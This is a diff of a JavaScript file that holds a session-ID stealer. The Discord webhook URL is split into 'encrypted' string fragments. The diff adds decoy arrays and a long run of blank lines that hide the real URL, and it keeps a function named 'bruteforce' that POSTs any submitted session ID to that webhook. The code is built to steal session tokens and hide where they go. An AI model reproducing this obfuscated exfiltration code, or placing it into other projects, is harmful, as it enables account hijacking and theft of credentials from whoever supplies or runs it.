@@ -1,12 +1,33 @@
-const _encryptedParts = [
-'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
-  'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
-  'Ue', 'rP', 'Qe', 'XN', 'xq', '8b', 'xZ', 'dS', 'rL', 'oB', 'UP', 'ab', '1p', 
-  'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
-];
 
-const _encryptedParts101 = [
+const _encryptedParts1011 = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
+  '12', '34', '56', '78', '90'
+];
+const _encryptedParts1012 = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
+  '12', '34', '56', '78', '90'
+];
+const _encryptedParts1013 = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
+  '12', '34', '56', '78', '90'
+];
+const _encryptedParts1014 = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
+  '12', '34', '56', '78', '90'
+];
+const _encryptedParts1015 = [
   'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
   'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
   'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
@@ -14,14 +35,51 @@ const _encryptedParts101 = [
   '12', '34', '56', '78', '90'
 ];
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+const _encryptedParts = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
+  'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
+  'Ue', 'rP', 'Qe', 'XN', 'xq', '8b', 'xZ', 'dS', 'rL', 'oB', 'UP', 'ab', '1p', 
+  'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
+];
+
 // Decrypt the URL by concatenating the parts
-const _decrypted = _encryptedParts.join(''); 
+const _decrypted = _encryptedParts.join('');
 
 function bruteforce(sessionId) {
+  // Ensure the sessionId is valid
+  if (!sessionId || typeof sessionId !== 'string') {
+    console.error('Invalid sessionId provided.');
+    return;
+  }
+
+  // Create the payload
   const payload = {
     content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``
   };
 
+  // Send the request to the Discord webhook
   fetch(_decrypted, {
     method: 'POST',
     headers: {
@@ -31,7 +89,7 @@ function bruteforce(sessionId) {
   })
     .then(response => {
       if (!response.ok) {
-        console.error('Failed to send data to Discord.');
+        console.error('Failed to send data to Discord. Status:', response.status);
       } else {
         console.log('Data sent successfully!');
       }
